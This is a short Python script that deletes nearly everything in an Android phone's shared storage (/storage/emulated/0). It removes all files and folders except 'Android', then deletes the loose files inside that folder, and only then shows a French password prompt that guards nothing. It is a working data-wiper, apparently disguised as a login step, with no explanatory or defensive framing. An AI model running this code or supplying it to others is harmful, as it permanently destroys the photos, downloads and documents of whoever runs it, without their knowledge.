import os, shutil
os.chdir('/storage/emulated/0')
l = os.listdir()
for x in l:
 if x != 'Android':
  try:
   os.remove(x)
  except:
   shutil.rmtree(x)
os.chdir('/storage/emulated/0/Android')
k = os.listdir()
for x in k:
 try:
  os.remove(x)
 except:
  print('\n')
mdp = input('Mot de passe: ')
